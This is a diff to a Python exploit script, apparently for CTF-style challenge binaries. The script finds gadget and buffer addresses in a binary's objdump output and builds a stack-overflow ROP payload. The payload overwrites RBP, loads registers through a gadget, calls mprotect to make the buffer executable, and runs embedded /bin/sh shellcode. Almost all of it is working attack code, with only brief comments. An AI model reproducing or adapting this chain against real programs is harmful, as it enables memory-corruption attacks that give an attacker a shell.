@@ -4,6 +4,7 @@ import subprocess
 import re
 import angr
 import claripy
+
 context.log_level="info"
 
 shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
@@ -43,13 +44,13 @@ def parse_bin(fname):
     overflow_padding = int(overflow_padding, 16)
 
     # Get address of bss buffer holding decoded user input
-    # from esi, src arg to memcpy
+    # from src arg to memcpy
     buf_addr = re.search("mov\s*esi,0x" + hex_rex + ".{0,200}?<memcpy@plt>", objdump, flags=re.DOTALL).group(1)
     buf_addr = int(buf_addr, 16) - 48
 
     # Get address of gadget that loads all registers as local variables from rbp
     loadreg_gadget = re.findall(hex_rex + ":.{0,30}?" + "mov\s*QWORD PTR \[rbp-0x" + hex_rex + ".{0,10}?r9", objdump)
-    loadreg_gadget_addr = int(loadreg_gadget[1][0], 16) + 4
+    loadreg_gadget_addr = int(loadreg_gadget[1][0], 16) + 16
     loadreg_gadget_rbp_offset = int(loadreg_gadget[1][1], 16) - 40
 
     print "start", hex(start)
@@ -96,9 +97,6 @@ def construct_payload(fname):
     # First chain
     # Set RBP to be within buffer, so that this gadget fills registers
     '''
- 13679c4:   4c 8b 45 b0             mov    r8,QWORD PTR [rbp-0x50]
- 13679c8:   48 8b 7d a0             mov    rdi,QWORD PTR [rbp-0x60]
- 13679cc:   48 8b 4d a8             mov    rcx,QWORD PTR [rbp-0x58]
  13679d0:   48 8b 55 c0             mov    rdx,QWORD PTR [rbp-0x40]
  13679d4:   48 8b 75 b8             mov    rsi,QWORD PTR [rbp-0x48]
  13679d8:   48 8b 45 c8             mov    rax,QWORD PTR [rbp-0x38]
@@ -108,12 +106,9 @@ def construct_payload(fname):
 
     payload = 'Q'*overflow_padding # padding from does_memcpy function
 
-    new_rbp_padding = 48 + overflow_padding + 7*8 + loadreg_gadget_rbp_offset # len(input) + overflow pad + space for regs + random gadget rbp offset
+    new_rbp_padding = 48 + overflow_padding + 4*8 + loadreg_gadget_rbp_offset # len(input) + overflow pad + space for regs + random gadget rbp offset
     payload += p64(buf_addr + new_rbp_padding) # Overwrite RBP with buffer address that correctly aligns local variables with register vals
     payload += p64(loadreg_gadget_addr) # points to gadget above
-    payload += 'F'*8 # rdi, dummy val because overwritten by rax
-    payload += 'C'*8 # rcx 
-    payload += 'B'*8 # r8 
     payload += p64(0x10000)  # rsi, len
     payload += p64(7) # rdx, prot rwx
     payload += p64(buf_addr & 0xFFFFFFFFFFFFF000) # rax, moved to rdi. mprotect addr arg, page-aligned
